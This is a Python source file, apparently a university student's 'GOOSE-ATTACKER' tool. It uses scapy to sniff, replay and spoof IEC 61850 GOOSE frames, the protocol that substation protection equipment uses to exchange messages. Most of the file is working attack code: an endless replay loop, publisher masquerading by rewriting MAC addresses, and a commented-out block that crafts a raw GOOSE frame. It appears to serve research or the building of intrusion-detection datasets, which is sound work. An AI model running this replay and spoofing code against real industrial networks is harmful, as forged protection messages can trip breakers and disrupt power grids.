from scapy.all import *
import dataset_generator
import os
import socket
from scapy.utils import PcapWriter
import sys
import pyshark
##########################################| DISCLAIMER AND INTERFACES INPUT |########################################

try:
    print ("\n")
    print ("      ================================================================")
    print ("      |                      |   Disclaimer:   |                     |")
    print ("      ================================================================")
    print ("      |           G  O  O   S   E   -  A  T  T  A  C  K  E  R        |")
    print ("      |++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|")
    print ("      |                                                              |")
    print ("      |   This work is based on other available frameworks (scapy)   |")
    print ("      | Neither author, nor the university should be held liable for |")
    print ("      |  unintended use of this program, GOOSE is part of IEC61850   |")
    print ("      |                              standard                        |")
    print ("      |                                                              |")
    print ("      ================================================================  ")
    print ("                       ||                        ||                ")
    print ("               ============================================")
    print ("               ==|                                      |==")
    print ("               ==|            SAGUN GHIMIRE             |==")
    print ("               ==|          STUDENT ID: N9623710        |==")
    print ("               ==|                                      |==")
    print ("               ============================================ \n \n")
    interface = raw_input("Enter interface name Used : ")
    publisherMac = "00:50:56:3d:9e:fd"
except KeyboardInterrupt:
    print ("\n !!! Process Interrupted by users")
    sys.exit(1)


    ##########################################| SNIFFING GOOSE FRAME |########################################

while True:
    attack_choice = raw_input(
        "\n[1] SNIFF GOOSE TRAFFIC AND SAVE IT AS A FILE\n[2] REPLAY GOOSE TRAFFIC \n[3] MASQUERADE AS A PUBLISHER  \n[4] GENERATE GOOSE DATASET \n[5] RETURN BACK TO MAIN MENU \n[0] EXIT THE GOOSE ATTACKER \n\nPLEASE SELECT YOUR ATTACK OPTION: ")
    if attack_choice == "1":
        timeOutPeriod = int(input("How long would you like to capture (in second) : "))  # Time for saving traffic
        capture_name = raw_input("Enter the name for your pcap file (without extension) : ")  # filename
        print (
            '\nSniffing GOOSE traffic from \n[*] Interface: {} \n[*] Source Mac: {} \n[*] For:{} seconds \n').format(
            interface , publisherMac , timeOutPeriod)
        # Sniffing the traffic from Publisher
        traffic = sniff(iface=interface, timeout=timeOutPeriod)
        outputPCAP = PcapWriter(capture_name + ".pcap" , append=True , sync=True)

        for frame in traffic:
            if frame.haslayer(Ether) == 1 and frame.haslayer(Dot1Q) == 1 and frame.haslayer(Raw) == 1:
                outputPCAP.write(frame)
        print "File saved as: " + capture_name
        break

    ##########################################| Reading GOOSE FRAME |########################################

    if attack_choice == "2":
        print(
        "You have selected to replay the GOOSE traffic \n!!!! Note: You must have saved pcap file first!!!, \nIf you havent already please restart the program (ctrl+x) and select option 0")
        pcap_name = raw_input("\n[*] Enter the name of the saved PCAP file (without extension) : ")
        #decoded = pyshark.FileCapture(pcap_name + ".pcap" , only_summaries=True)

        traffic = rdpcap(pcap_name + '.pcap') #tyui.pcap
        # Let's iterate through every frame
       # i = 0
        while True:
            for frame in traffic:   #frame = line
              if frame.haslayer(Ether) == 1 and frame.haslayer(Dot1Q) == 1 and frame.haslayer(Raw) == 1:
                 print frame
                 sendp(frame, iface=interface)
                 time.sleep(0.01)



        ##########################################| INJECTING GOOSE FRAME |########################################

    elif attack_choice == "3":

        # CONSTRUCTING ETHERNET HEADER

        print(
            "You have selected to replay the GOOSE traffic \n!!!! Note: You must have saved pcap file first!!!, \nIf you havent already please restart the program (ctrl+x) and select option 0")
        pcap_name = raw_input("\n[*] Enter the name of the saved PCAP file (without extension) : ")
        # decoded = pyshark.FileCapture(pcap_name + ".pcap" , only_summaries=True)

        traffic = rdpcap(pcap_name + '.pcap')  # name of the.pcap
        # Let's iterate through every frame
        # i = 0


        #while True:

        for frame in traffic:  # frame = line

            #frame.dst = "01:0c:cd:01:00:00"
            #frame.dst = "00:50:56:3C:BB:7B"
            #frame.src = "00:50:56:3D:9E:FD"
            #frame.type = 0x8100
            if frame.haslayer(Ether) == 1 and frame.haslayer(Dot1Q) == 1 and frame.haslayer(Raw) == 1:
            	frame.src = "00:50:56:3C:BB:7C"
                print frame
                sendp(frame , iface=interface)
                time.sleep(0.1)

        '''

        header_content = Ether()
        header_content.dst = "00:50:56:3D:9E:FD"
        header_content.src = "00:50:56:3C:BB:7B"
        header_content.type = 0x8100

        # CONSTRUCTING VLAN HEADER  0x88b8
        header_VLAN = Dot1Q()
        header_VLAN.prio = 4
        header_VLAN.id = 0
        header_VLAN.vlan = 0
        header_VLAN.type = 0x88b8

        # CONSTRUCTING GOOSE MESSAGE
        goose_msg = Raw()
        goose_msg.load = "b'\x00\x01\x00P\x00\x00\x00\x00aF\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$DS4\x83\x02G1\x84\x08Y\xde8\xa2\xd6\x04\x13x\x85\x01\x07\x86\x01\x11\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\x0b\x83\x01\x01\x85\x01\n\x84\x03\x03@\x00'"
        # blablabla
        ls(header_VLAN)
        ls(goose_msg)
        ls(header_content)

        new_Goose_Frame = header_content / header_VLAN / goose_msg
        sendp(new_Goose_Frame , iface=interface)
    '''
        break

    elif attack_choice == "4":
        os.system('python dataset_generator.py')
        

    ##########################################| END PROGRAM  |########################################

    elif attack_choice == "0":
        sys.exit(1)
    print ("\nERROR: INVALID SELECTION TRY AGAIN ")
    # return back to attack_choice
